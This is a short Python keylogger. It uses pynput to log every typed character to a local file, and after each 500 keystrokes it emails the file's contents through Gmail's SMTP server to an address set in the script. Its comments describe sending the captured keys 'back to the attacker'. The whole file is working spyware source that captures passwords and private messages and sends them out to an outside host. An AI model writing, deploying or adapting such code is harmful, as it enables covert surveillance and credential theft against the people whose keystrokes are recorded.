from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText




#Necessary counter for keeping track of keystrokes before sending the key file back to the attacker.
counter =0


def pressedKeys(key):
    print(str(key))
    
    #Making counter into a global variable to then be used throughout defined function.
    global counter
    
    #Open the file to log keystrokes.
    with open("keyfile.txt", 'a') as logkey:
        try:

            #Registers key strokes by 
            char = key.char
            logkey.write(char)
            #Debugging tool for knowing when something is registered.
            print("char reg")
            counter+=1
            print(counter)

        #Useful for debugging what can and cannot be registered.    
        except:
            print("Error")


    '''This if statement uses the counter variable to register when 500 keys have been used. Upon reaching this limit the counter
    is reset to allow the next 500 to be registered. Using the SMTP protol and googles open SMTP server, the code will email whoever
    is listed for the recipient from whatever account is used. Using pythons reading feature the key file that is generated earlier
    will be read and used as a message body. '''

    
    if (counter == 500):
        counter-=500
        print("uwu")
        with open("keyfile.txt", 'r') as f:
            contents = f.read()
        
        
        #Config for gmail
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587 #TLS
        smtp_user = 'yourEmail@something.com'
        smtp_password = 'application password from google'

        #Content of the email
        from_addr='yourEmail@something.com'
        to_addr = 'yourEmail@something.com'
        subject = 'KeyLogger update'
        body = contents

        #Creation of the email
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        #Send it
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_user, smtp_password)
        server.send_message(msg)
        server.quit()


#Prevents the code from being used on accident.
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=pressedKeys)
    listener.start()
    input()